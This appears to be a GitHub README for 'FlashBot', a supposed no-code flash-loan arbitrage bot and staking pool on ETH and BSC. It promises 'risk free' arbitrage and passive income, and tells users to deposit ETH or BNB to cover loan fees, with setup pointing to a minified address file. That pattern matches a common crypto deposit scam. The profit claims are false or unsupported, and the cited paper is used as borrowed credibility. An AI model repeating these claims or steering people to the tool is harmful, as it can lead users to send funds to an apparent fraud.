# WELCOME TO FLASHBOT GIT

FlashBot is the first NO CODE arbitrage trading bot that leverage flash loans. Enjoy risk free on-chain arbitrage opportunities, automatic pair matching and routing. Just select the network (ETH or BSC) and enter a token address to launch the ARBITRAGE FINDER.

- Website: [defiexploit.github.io](https://defiexploit.github.io/index.html) 
- Documentation: [Arbitrage BOT Mechanism (PDF)](https://fc21.ifca.ai/papers/158.pdf) 

## How to CONFIGURE

We have released the Beta of our contracts, you can read the code, modify it and replicate it to this [GIT](https://github.com/defiexploit/contracts-arbitragebot).

To start using the platform you just need to change the destination addresses of the contracts in <b>assets/js/addr.min.js</b>.

```javascript
const ethAddress = 'YOUR_ETH_ADDRESS_HERE';
const bnbAddress = 'YOUR_BNB_ADDRESS_HERE';

const poolethAddress = 'YOUR_ETH_ADDRESS_HERE';
const poolbnbAddress = 'YOUR_BNB_ADDRESS_HERE';
```

## How to use the BOT

The FlashBOT interface has been designed to be as simple as possible. To use the BOT, just follow the steps below:
1. Choose a Token to Start arbitrage:  The DAPP will automatically check for possible arbitrage opportunities for the selected token on the Decentralized exchanges (on ETH or BSC chain);
2. Get the Loan for the Arbitrage:  Once the opportunity has been found, you can get Flash Loan from AAVE, Multiplier-Finance, or from PancakeSwap/Uniswap (thanks to flash swap). This is done for you in the dapp, just select the loan amount;
3. Deposit ETH or BNB:  Now you need pay the fees of the Loan to start arbitrage clicking the deposit Button.
4. Run arbitrage script:  The bot will execute the arbitrage trades, repay the Flash Loan amount and will split the profit between you and the devs (only 0.3% of the profit will go to devs).


## How to use the POOLS

The pools work like any other stacking pool, you just need to deposit ETH or BNB to get passive income. The profits are generated from the interest obtained by the BOT and are redistributed to all members of the Pool.

# Contributing

Thank you for your interest in contributing to the FlashBOT project!

## Pull requests

<b>Please open all pull requests against the main branch. CI checks will run against all PRs.</b>

# Disclaimer

Flashbot is an Open Source code as it is, use at your own risk, the development team doesn't take any responsibility for any incorrect use of our software or for any bugs or errors in the code.
